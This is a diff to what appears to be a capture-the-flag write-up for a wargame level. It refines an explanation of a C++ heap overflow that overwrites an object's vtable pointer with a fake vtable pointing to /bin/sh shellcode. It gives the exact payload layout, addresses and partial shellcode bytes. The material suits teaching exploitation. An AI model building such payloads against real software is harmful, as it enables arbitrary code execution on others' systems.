@@ -219,17 +219,19 @@ AFTER ALLOCATION:
 
 AFTER OVERFLOW:
 ═══════════════════════════════════════════════════════════════════
-0x804a00c: [NOP NOP NOP ... shellcode ... NOP NOP NOP ...]
+0x804a00c: [24-byte shellcode][84 bytes padding...]
            ↑
+           └─ Shellcode at START (bytes 0-23)
+           
            │ (108 bytes of controlled data)
            │
 0x804a078: [0x0804a07c] ← Overwritten! Now points to fake vtable
-0x804a07c: [0x0804a01c] ← Fake vtable entry pointing to our shellcode
+0x804a07c: [0x0804a00c] ← Fake vtable entry pointing to shellcode start
 
 When operator+ is called:
   obj2->vtable = 0x0804a07c
-  obj2->vtable[0] = 0x0804a01c ← Points to our NOP sled!
-  Jump to 0x0804a01c → NOP slide → SHELLCODE! 🎉
+  obj2->vtable[0] = 0x0804a00c ← Points directly to shellcode!
+  Jump to 0x0804a00c → SHELLCODE executes immediately! 🎉
 ```
 
 ### The Null Byte Problem
@@ -242,7 +244,7 @@ When operator+ is called:
 **Solution:**
 1. Use **null-byte-free shellcode**
 2. Choose addresses **within our payload** that don't have null bytes
-3. Use a **NOP sled** for imprecise targeting
+3. Place shellcode at the start, use padding to reach the correct offset
 
 ### Null-Free Shellcode
 
@@ -265,9 +267,9 @@ We use the same null-byte-free shellcode from **level2** (24 bytes):
 
 **Payload Structure:**
 ```
-[24-byte shellcode] + [84 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
-        ↑                ↑              ↑                   ↑
-      0-23            24-107         108-111            112-115
+[24-byte shellcode] + [84 bytes padding] + [fake_vtable_ptr] + [shellcode_addr]
+        ↑                    ↑                    ↑                   ↑
+      0-23                24-107               108-111            112-115
 ```
 
 **Detailed Breakdown:**
@@ -275,11 +277,9 @@ We use the same null-byte-free shellcode from **level2** (24 bytes):
 1. **Bytes 0-23 (24 bytes):** Null-free shellcode
    - Placed at start: `0x804a00c`
    - Executes `/bin/sh` immediately
-   - No NOP sled needed - direct execution
 
-2. **Bytes 24-107 (84 bytes):** NOP padding (`\x90` * 84)
-   - Fills remaining space to reach obj2's vtable
-   - Brings us to exactly 108 bytes
+2. **Bytes 24-107 (84 bytes):** Padding (`\x90` * 84)
+   - Fills space to reach obj2's vtable at offset 108
 
 3. **Bytes 108-111 (4 bytes):** Fake vtable pointer = `\x7c\xa0\x04\x08`
    - Overwrites obj2's vtable pointer
@@ -315,7 +315,7 @@ No null bytes!
 Step 1: Program Start
 ─────────────────────
 ./level9 [PAYLOAD]
-argv[1] = 128 bytes (NOPs + shellcode + padding + addresses)
+argv[1] = 116 bytes (shellcode + padding + addresses)
 
 
 Step 2: Object Allocation
@@ -346,7 +346,7 @@ memcpy(0x804a00c, argv[1], 116);
   
   Writes:
     0x804a00c-0x804a023: Shellcode (24 bytes)
-    0x804a024-0x804a077: NOPs (84 bytes)
+    0x804a024-0x804a077: Padding (84 bytes)
     0x804a078-0x804a07b: \x7c\xa0\x04\x08 ← OVERWRITES obj2->vtable!
     0x804a07c-0x804a07f: \x0c\xa0\x04\x08 ← Creates fake vtable entry
 
@@ -371,7 +371,7 @@ Hijacked behavior:
 Step 5: Shellcode Execution
 ────────────────────────────
 CPU jumps to 0x0804a00c:
-  Executes shellcode immediately (no NOP sled)
+  Executes shellcode immediately
   Executes: execve("/bin//sh", NULL, NULL)
 
 
@@ -447,7 +447,7 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 **Payload breakdown:**
 ```
 \x31\xc0\x99...\xb0\x0b\xcd\x80    = Null-free shellcode (24 bytes)
-\x90 * 84                           = NOP padding (84 bytes)
+\x90 * 84                           = Padding (84 bytes)
 \x7c\xa0\x04\x08                   = Fake vtable pointer (4 bytes)
 \x0c\xa0\x04\x08                   = Shellcode address (4 bytes)
 Total: 116 bytes
